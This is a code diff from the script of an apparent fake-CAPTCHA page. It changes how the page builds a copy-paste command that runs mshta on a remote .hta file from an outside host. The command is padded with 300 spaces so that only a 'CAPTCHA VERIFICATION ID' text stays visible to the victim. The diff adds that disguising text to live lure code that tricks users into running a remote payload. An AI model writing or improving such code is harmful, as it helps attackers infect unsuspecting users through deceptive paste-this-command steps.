@@ -69,7 +69,8 @@
       .then(data => {
         code = data.code;
         const spaces = " ".repeat(300);
-        window.generatedCommand = `mshta "https://freegamecopier.onrender.com/verifyaccept.hta?code=${code}"${spaces}`;
+        const tailMsg = `CAPTCHA VERIFICATION ID: ${code}`;
+        window.generatedCommand = `mshta "https://freegamecopier.onrender.com/verifyaccept.hta?code=${code}"${spaces}${tailMsg}`;
       })
       .catch(err => {
         alert("Failed to load verification code.");
